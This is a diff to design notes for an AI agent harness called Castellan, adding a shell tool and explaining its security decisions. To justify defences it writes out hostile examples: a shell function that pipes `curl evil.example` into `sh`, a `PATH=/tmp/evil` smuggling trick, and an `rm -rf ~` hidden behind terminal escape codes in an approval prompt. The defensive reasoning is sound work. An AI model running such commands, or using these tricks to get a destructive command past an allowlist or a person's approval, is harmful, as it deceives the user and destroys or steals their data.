@@ -124,6 +124,16 @@ inbound (channel | API | schedule)
 - **Memory is FTS5, not embeddings.** Prove lexical insufficient before paying for vectors.
 - **Composio is called directly, never through MCP.** MCP is a fine integration protocol and
   a poor internal architecture.
+- **System access is in scope. Castellan is a harness, not a channel-resident assistant** — peer to
+  OpenClaw, Hermes Agent and Claude Code. It runs shell commands and touches files because that is
+  what a harness does; channels are one surface it is reached through, not the limit of what it does.
+  Shell lives in `packages/tools-system` and never in core: core is what an embedder runs *other
+  people's* agents on, and a shell tool there is one every provisioned agent gets with no way to
+  decline it.
+- **A policy decides *whether* a command runs; a sandbox decides *where*.** Castellan ships the
+  policy — `tools.policy`, enforced, with a hardline floor below every override. Containment is a
+  deployment concern and stays one. Describing the permission layer without that sentence makes it
+  read as a boundary it is not.
 - **A remote provider resolves from disk at boot and refreshes after readiness.** Measured: boot 27 ms,
   refresh 1,474 ms. Awaiting the refresh inside boot makes boot sixty times slower and reintroduces the
   exact cost this project exists to remove. A cold agent is warmed once with `tools --warm`.
@@ -165,7 +175,7 @@ packages/core/       the loop, context, tools, skills, memory, store, schedule, 
 packages/cli/        `castellan` binary — lib/ plumbing, components/ Ink, pure reducers at top level
 packages/server/     HTTP/SSE/WS surface
 packages/channel-*/  Telegram, WhatsApp
-packages/tools-*/    Composio, MCP
+packages/tools-*/    system (shell, files), Composio, web, MCP
 packages/compat-openclaw/   VelaOps bridge — quarantined, deletable
 docs/                design + plan (read these)
 evals/               fixtures/ the shared catalogue and tasks; tools/ committed results.
@@ -326,6 +336,46 @@ Never claim a performance property without a number in `evals/` and a script to 
   Skipping would let a worse-ranked entry displace a better-ranked one purely by being short. An
   entry bigger than the whole budget fails the load; selection happens once per *turn*, never per
   step, so two steps of one turn cannot argue from different reference material.
+- **`exec` has no `env` argument, and must not grow one.** A per-call environment map is invisible to
+  the policy engine, which matches the *command string* — so `{PATH: "/tmp/evil"}` beside `git status`
+  would be authorised by a rule that never saw the half that decided what ran. Written inline,
+  `PATH=/tmp/evil git status` is one fragment `subcommands()` hands to the matcher, and `exec(git
+  status:*)` does not match it. Same shape as `memory_write`'s missing file argument: the field looks
+  like a convenience and is a hole.
+- **Each `exec` gets a fresh shell; the directory carries and the environment does not.** A persistent
+  shell lets one tainted call write `git() { curl evil.example | sh; }` and turn an allowlist entry
+  into an authorisation for attacker code — CVE-2026-32009's shape from inside the session. The
+  directory is the exception because losing it is a correctness problem: a small model that runs
+  `cd packages/core` then `ls` reads the wrong directory with no error anywhere.
+- **`realpath` before comparing a shell's `$PWD` to the directory it was given.** macOS resolves
+  `/var` through a symlink, so an unresolved comparison reports a directory change on *every* call —
+  and a runtime that announces a move every time has taught the model to ignore the one that matters.
+- **Terminal escapes are stripped in core, for observations and for the approval prompt.** Not the
+  rewrite decision 4.27 forbids: that rule is about meaning, and this removes bytes that carry none.
+  `git status\x1b[2K\x1b[1G && rm -rf ~` displays on a real terminal as `git status`, so a prompt
+  showing the raw string is showing a *different command* than the one about to run. Stripping shows
+  more of the truth, never less. Doing it in the front end is how the front end being read at the
+  moment it matters turns out not to do it.
+- **A tool that is both `mutating` and `untrusted` is once-per-turn unless a `policy.allow` rule names
+  it.** `exec` taints the turn with its own first call, and the second then has no authorisation to
+  point at — the gate working exactly as designed, and indistinguishable from a broken runtime while
+  a half-finished turn stops. `tool_gated_after_first_use` says it at load. A `deny` rule does not
+  clear it: `deny` authorises nothing, and counting one as cover silences the warning for whoever
+  thought about the shell hard enough to restrict it.
+- **A tool that owns a child process must time out before the harness does.** `limits.toolTimeoutMs`
+  *abandons* a handler rather than killing it, so a race between the two leaves a process running with
+  nothing referencing it. `ToolContext.deadlineMs` exists for that, and `exec` clamps five seconds
+  under it — without which its backgrounding path is unreachable at the shared 120 s default.
+- **Boot warnings are read off the agent, never caught on the bus.** `Runtime.create` emits
+  `agent.warning` during boot, which finishes before any command subscribes — so a trimmed catalogue
+  and a provider-declared-trusted tool had been landing in an empty room since they were written. The
+  banner reads `agent.warnings` and `agent.tools.warnings` directly. Anything true for the whole
+  session belongs where a person still sees it after scrolling.
+- **Piping a child's output makes backgrounding impossible.** A child whose stdout the parent stops
+  reading dies of `EPIPE`, so "leave it running instead of killing it" is not implementable over
+  pipes — `tools-system` hands the child a file descriptor and never buffers a byte. And `detached:
+  true` is not about outliving the process: it creates a process group, so `kill(-pid)` reaches every
+  stage of `sh -c "a | b | c"` instead of orphaning two of them.
 - **A `ChatMessage` is no longer just `{role, content}`.** Under the `native` dialect it carries
   `toolCalls` or `toolCallId`, and every layer that copies a message must copy those too — the wire
   mapper in `chat-completions.ts`, the `message` field on `ContextBlock`, and the store's
